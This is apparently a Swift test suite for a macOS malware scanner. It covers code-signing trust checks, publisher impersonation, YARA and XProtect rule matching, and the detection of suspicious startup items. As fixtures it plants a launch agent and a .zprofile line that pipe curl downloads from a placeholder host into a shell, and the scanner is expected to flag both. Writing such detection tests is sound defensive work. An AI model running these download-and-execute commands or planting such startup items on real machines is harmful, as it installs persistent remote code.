import Foundation
import Testing
@testable import MacScanCore

// MARK: - Signer checks

@Suite(.serialized) struct SignerCheckTests {
    @Test func appleBinaryChainsToApple() {
        guard case .signed = CodeSigning.status(of: URL(fileURLWithPath: "/usr/bin/true")) else {
            Issue.record("expected Apple-signed"); return
        }
    }

    @Test func selfSignedExecutableIsThreat() throws {
        let dir = try TempDir()
        guard let sign = makeSelfSignedSigner(in: dir) else {
            Issue.record("could not create a self-signed test identity"); return
        }
        let tool = try dir.copy("/usr/bin/true", to: "tool")
        #expect(try sign(tool) == 0)

        let status = CodeSigning.status(of: tool)
        guard case .selfSigned(_, let authority) = status else {
            Issue.record("expected selfSigned, got \(status)"); return
        }
        #expect(authority == "MacScan Test Self-Signed")
        #expect(status.isUntrusted)

        let finding = try #require(AppIntegrityEngine.executableFinding(item: ScanItem(url: tool, kind: .file, isMachO: true), status: status, bundleStatus: nil))
        #expect(finding.severity == .threat)
        #expect(finding.reason.contains("Self-signed"))
    }

    @Test func selfSignedAppIsThreat() async throws {
        let dir = try TempDir()
        guard let sign = makeSelfSignedSigner(in: dir) else {
            Issue.record("could not create a self-signed test identity"); return
        }
        let app = try dir.makeApp("Cracked")
        #expect(try sign(app) == 0)

        let findings = try await AppIntegrityEngine().checkBundle(app, context: .test)
        let selfSigned = try #require(findings.first { $0.reason == "App is signed with a self-signed certificate" })
        #expect(selfSigned.severity == .threat)
        #expect(selfSigned.detail?.contains("MacScan Test Self-Signed") == true)
    }

    @Test func impersonationDetection() {
        let chrome = "com.google.Chrome"
        let genuine = SigningStatus.signed(identifier: chrome, teamID: "EQHXZ8M8AV", authority: "Developer ID Application: Google LLC")
        let otherTeam = SigningStatus.signed(identifier: chrome, teamID: "ABCDE12345", authority: "Developer ID Application: Someone")
        #expect(AppIntegrityEngine.impersonationProblem(bundleID: chrome, status: genuine) == nil)
        #expect(AppIntegrityEngine.impersonationProblem(bundleID: chrome, status: otherTeam)?.0 == .threat)
        #expect(AppIntegrityEngine.impersonationProblem(bundleID: chrome, status: .adhoc(identifier: nil))?.1.contains("Google") == true)
        #expect(AppIntegrityEngine.impersonationProblem(bundleID: "com.microsoft.Word", status: .selfSigned(identifier: nil, authority: "X")) != nil)
        // Unknown publishers and generic prefixes are never judged.
        #expect(AppIntegrityEngine.impersonationProblem(bundleID: "com.github.someone.app", status: .adhoc(identifier: nil)) == nil)
        #expect(AppIntegrityEngine.impersonationProblem(bundleID: "org.example.tool", status: .unsigned) == nil)
        #expect(AppIntegrityEngine.impersonationProblem(bundleID: chrome, status: .unreadable("x")) == nil)
    }

    @Test func installedPublisherAppsAreNotFlagged() async throws {
        // Any genuinely installed app from the publisher table must pass the impersonation check.
        let apps = (try? FileManager.default.contentsOfDirectory(atPath: "/Applications")) ?? []
        for name in apps where name.hasSuffix(".app") {
            let url = URL(fileURLWithPath: "/Applications/\(name)")
            guard let id = Bundle(url: url)?.bundleIdentifier, KnownPublishers.publisher(forBundleID: id) != nil else { continue }
            let status = CodeSigning.status(of: url)
            guard case .signed = status else { continue }
            #expect(AppIntegrityEngine.impersonationProblem(bundleID: id, status: status) == nil, "\(name) wrongly flagged")
        }
    }
}

// MARK: - XProtect rules

@Suite struct XProtectRuleTests {
    static let yara = ToolLocator.autodetect(.yara)
    static let yarac = ToolLocator.autodetect(.yarac)
    static let hasXProtect = FileManager.default.isReadableFile(atPath: YaraEngine.xprotectRulesURL.path)

    @Test func parsesNamespacedMatches() throws {
        let m = try #require(YaraEngine.parseMatch(#"xprotect:XProtect_MACOS_abc [description="MACOS.abc",uuid="1-2"] /tmp/x"#))
        #expect(m.namespace == "xprotect")
        #expect(m.rule == "XProtect_MACOS_abc")
        let f = YaraEngine.finding(for: ScanItem(url: URL(fileURLWithPath: "/tmp/x"), kind: .file), match: m)
        #expect(f.severity == .threat)
        #expect(f.reason == "Apple XProtect: MACOS.abc")

        let d = try #require(YaraEngine.parseMatch("default:My_Rule /tmp/y"))
        #expect(d.namespace == nil)
        #expect(d.rule == "My_Rule")
    }

    @Test(.enabled(if: yara != nil && yarac != nil, "yara not installed"))
    func namespacedExtraRulesFlowThroughEngine() async throws {
        let dir = try TempDir()
        let rule = try dir.write("fake-xprotect.yara", #"rule XProtect_MACOS_test { meta: description = "MACOS.test" strings: $a = "XPROTECT-PIPELINE-MARKER" condition: $a }"#)
        try dir.write("folder/own.yar", #"rule Own_Rule { strings: $a = "OWN-MARKER" condition: $a }"#)
        let hit = try dir.write("files/hit.bin", "XPROTECT-PIPELINE-MARKER and OWN-MARKER")
        let engine = YaraEngine(
            yaraURL: URL(fileURLWithPath: Self.yara!), yaracURL: URL(fileURLWithPath: Self.yarac!),
            rulesFolder: dir.url.appendingPathComponent("folder"),
            extraRules: [("xprotect", rule)])
        let recorder = EventRecorder()
        try await engine.scan([ScanItem(url: hit, kind: .file)], context: .test, events: recorder.sink)
        let reasons = await recorder.findings.map(\.reason)
        #expect(reasons.contains("Apple XProtect: MACOS.test"))
        #expect(reasons.contains("YARA rule Own_Rule matched"))
    }

    @Test(.enabled(if: yara != nil && yarac != nil && hasXProtect, "XProtect rules or yara missing"))
    func realXProtectRulesCompileAndStayQuietOnCleanFiles() async throws {
        var settings = ScanSettings()
        settings.useXProtectRules = true
        let engine = YaraEngine(settings: settings)
        guard case .available(let detail) = await engine.availability() else {
            Issue.record("expected available"); return
        }
        #expect(detail.contains("Apple XProtect"))
        let dir = try TempDir()
        let text = try dir.write("plain.txt", "hello world")
        let recorder = EventRecorder()
        try await engine.scan([ScanItem(url: URL(fileURLWithPath: "/usr/bin/true"), kind: .file), ScanItem(url: text, kind: .file)], context: .test, events: recorder.sink)
        #expect(await recorder.findings.isEmpty)
    }
}

// MARK: - Persistence

@Suite struct PersistenceTests {
    func writePlist(_ dir: TempDir, _ relative: String, _ dict: [String: Any]) throws {
        let data = try PropertyListSerialization.data(fromPropertyList: dict, format: .xml, options: 0)
        try dir.write(relative, data)
    }

    func scanner(_ root: TempDir, _ home: TempDir) -> PersistenceScanner {
        PersistenceScanner(locations: PersistenceLocations(home: home.url, root: root.url, includeCrontab: false))
    }

    @Test func classifiesStartupItems() throws {
        let root = try TempDir()
        let home = try TempDir()

        // Root daemon running an unsigned helper → threat.
        let helper = try root.copy("/usr/bin/true", to: "Library/PrivilegedHelperTools/com.example.helper")
        try shell("/usr/bin/codesign", ["--remove-signature", helper.path])
        try writePlist(root, "Library/LaunchDaemons/com.example.helper.plist", ["Label": "com.example.helper", "Program": helper.path, "RunAtLoad": true])

        // User agent pointing to a deleted program → warning.
        try writePlist(home, "Library/LaunchAgents/com.example.gone.plist", ["Label": "com.example.gone", "ProgramArguments": ["/Applications/Gone.app/Contents/MacOS/Gone"]])

        // Agent that downloads and runs a script → warning.
        try writePlist(root, "Library/LaunchAgents/com.example.dropper.plist", ["Label": "com.example.dropper", "ProgramArguments": ["/bin/bash", "-c", "curl -s https://example.invalid/x | bash"]])

        // Apple-signed program → clean.
        try writePlist(root, "Library/LaunchAgents/com.example.ok.plist", ["Label": "com.example.ok", "ProgramArguments": ["/usr/bin/true"]])

        // Empty placeholder plist → clean "inactive".
        try writePlist(home, "Library/LaunchAgents/com.example.empty.plist", [:])
        // Cache folder in a plug-in location is not a plug-in.
        try home.write("Library/Spotlight/ExtensionsCache/x", "cache")
        try home.write("Library/Spotlight/Real.mdimporter/Contents/Info.plist", "x")

        // Broken plist → warning.
        try root.write("Library/LaunchAgents/broken.plist", "not a plist")

        // Shell files.
        try home.write(".zshrc", "eval \"$(/opt/homebrew/bin/brew shellenv)\"\nexport PATH=$PATH:~/bin\n")
        try home.write(".zprofile", "# setup\ncurl -fsSL https://example.invalid/i.sh | sh\n")

        // Orphan helper (not referenced by a daemon), ad-hoc → warning.
        let orphan = try root.copy("/usr/bin/true", to: "Library/PrivilegedHelperTools/com.example.orphan")
        try shell("/usr/bin/codesign", ["--force", "--sign", "-", orphan.path])

        let inv = try scanner(root, home).collect()
        func finding(_ suffix: String) -> Finding? { inv.findings.first { $0.path.hasSuffix(suffix) } }

        let daemon = try #require(finding("com.example.helper.plist"))
        #expect(daemon.severity == .threat)
        #expect(daemon.reason.contains("Runs as root"))
        #expect(daemon.detail?.contains("Runs as root at startup") == true)

        #expect(finding("com.example.gone.plist")?.reason == "Startup item points to a missing program")
        #expect(finding("com.example.dropper.plist")?.reason.contains("downloads and runs a script") == true)
        #expect(finding("com.example.ok.plist")?.severity == .clean)
        #expect(finding("broken.plist")?.reason == "Startup item can't be read")
        #expect(finding("com.example.empty.plist")?.reason == "Inactive startup item (starts nothing)")
        #expect(finding("com.example.empty.plist")?.severity == .clean)
        #expect(finding("ExtensionsCache") == nil)
        #expect(finding("Real.mdimporter")?.reason == "Loaded automatically by macOS (Spotlight importer)")
        #expect(finding(".zshrc")?.severity == .clean, "brew shellenv must not be flagged")
        #expect(finding(".zprofile")?.reason.contains("downloads and runs a script") == true)

        let orphanFinding = try #require(finding("com.example.orphan"))
        // Test folders live under /private/var/folders, which also counts as an unusual location.
        #expect(orphanFinding.severity == .warning)
        #expect(orphanFinding.detail?.contains("Runs as root with an ad-hoc signed program") == true)
        #expect(!inv.findings.contains { $0.path == helper.path }, "referenced helper is described by its daemon, not listed twice")

        #expect(inv.programPaths.contains(helper.path))
        #expect(inv.findings.allSatisfy { $0.engine == .persistence })
    }

    @Test func packageManagerBinariesAreNotFlaggedAsAdhoc() {
        let item = ScanItem(url: URL(fileURLWithPath: "/opt/homebrew/Cellar/redis/8.0/bin/redis-server"), kind: .file, isMachO: true)
        #expect(AppIntegrityEngine.executableFinding(item: item, status: .adhoc(identifier: nil), bundleStatus: nil) == nil)
        // Self-signed is still a threat even there.
        #expect(AppIntegrityEngine.executableFinding(item: item, status: .selfSigned(identifier: nil, authority: "x"), bundleStatus: nil)?.severity == .threat)
    }

    @Test func unusualLocations() {
        #expect(PersistenceScanner.isUnusualLocation("/tmp/x"))
        #expect(PersistenceScanner.isUnusualLocation("/Users/Shared/.hidden/agent"))
        #expect(PersistenceScanner.isUnusualLocation("/Users/me/Library/.cache2/run"))
        #expect(!PersistenceScanner.isUnusualLocation("/Users/me/.local/bin/tool"))
        #expect(!PersistenceScanner.isUnusualLocation("/Applications/Docker.app/Contents/MacOS/com.docker.backend"))
    }

    @Test func enclosingApp() {
        #expect(PersistenceScanner.enclosingApp(of: "/Applications/A.app/Contents/Library/LoginItems/H.app/Contents/MacOS/H")?.path == "/Applications/A.app")
        #expect(PersistenceScanner.enclosingApp(of: "/usr/local/bin/x") == nil)
    }

    @Test func coordinatorIntegratesStartupItems() async throws {
        let root = try TempDir()
        let home = try TempDir()
        let helper = try root.copy("/usr/bin/true", to: "Library/PrivilegedHelperTools/com.example.h")
        try shell("/usr/bin/codesign", ["--remove-signature", helper.path])
        let data = try PropertyListSerialization.data(fromPropertyList: ["Label": "com.example.h", "Program": helper.path], format: .xml, options: 0)
        try root.write("Library/LaunchDaemons/com.example.h.plist", data)

        var settings = ScanSettings()
        settings.enableClamAV = false
        settings.enableYara = false
        let coordinator = ScanCoordinator(
            engines: EngineFactory.makeEngines(settings: settings), settings: settings,
            logger: FileLogger(directory: FileManager.default.temporaryDirectory.appendingPathComponent("MacScanTestLogs")),
            persistenceLocations: PersistenceLocations(home: home.url, root: root.url, includeCrontab: false))
        let session = await coordinator.run(targets: [.startupItems]) { _ in }

        #expect(session.enginesUsed.contains(.persistence))
        #expect(session.findings.contains { $0.engine == .persistence && $0.severity == .threat })
        // The integrity engine also checked the helper binary itself.
        #expect(session.findings.contains { $0.engine == .integrity && $0.path == helper.path && $0.reason == "Unsigned executable" })
        // Covered units don't get redundant "No issues found" rows.
        #expect(!session.findings.contains { $0.engine == .scanner })
    }
}
